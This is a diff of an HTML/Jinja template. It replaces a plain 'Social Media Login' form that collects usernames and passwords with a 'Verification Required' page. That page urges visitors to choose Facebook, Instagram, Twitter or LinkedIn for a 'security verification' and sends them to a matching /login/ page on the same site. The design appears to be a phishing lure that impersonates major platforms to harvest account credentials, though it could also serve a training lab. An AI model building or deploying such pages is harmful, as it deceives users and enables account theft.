@@ -1,17 +1,80 @@
 {% extends "base.html" %}
 {% block content %}
 
-<h2>Social Media Login</h2>
+<style>
+    /* Clean, centered selection page */
+    .container {
+        max-width: 600px;
+        margin: 100px auto;
+        text-align: center;
+        background: white;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
 
+    h2 {
+        margin-top: 0;
+        color: #333;
+    }
 
-<form method="POST">
-    Username:<br>
-    <input type="text" name="email" required><br><br>
+    p {
+        color: #666;
+        margin-bottom: 30px;
+    }
 
-    Password:<br>
-    <input type="password" name="password" required><br><br>
+    select {
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        margin-bottom: 20px;
+        background-color: white;
+    }
 
-    <button type="submit">Login</button>
-</form>
+    .continue-btn {
+        background-color: #007bff;
+        color: white;
+        border: none;
+        padding: 14px 24px;
+        font-size: 16px;
+        border-radius: 4px;
+        cursor: pointer;
+        width: 100%;
+        font-weight: bold;
+    }
+
+    .continue-btn:hover {
+        background-color: #0056b3;
+    }
+</style>
+
+<div class="container">
+    <h2>Verification Required</h2>
+    <p>Please select your social media platform to proceed with the security verification.</p>
+
+    <select id="platform">
+        <option value="" disabled selected>-- Select Platform --</option>
+        <option value="facebook">Facebook</option>
+        <option value="instagram">Instagram</option>
+        <option value="twitter">Twitter (X)</option>
+        <option value="linkedin">LinkedIn</option>
+    </select>
+
+    <button class="continue-btn" onclick="goToPlatform()">Continue</button>
+</div>
+
+<script>
+    function goToPlatform() {
+        const platform = document.getElementById("platform").value;
+        if (platform) {
+            window.location.href = "/login/" + platform;
+        } else {
+            alert("Please select a platform first.");
+        }
+    }
+</script>
 
 {% endblock %}
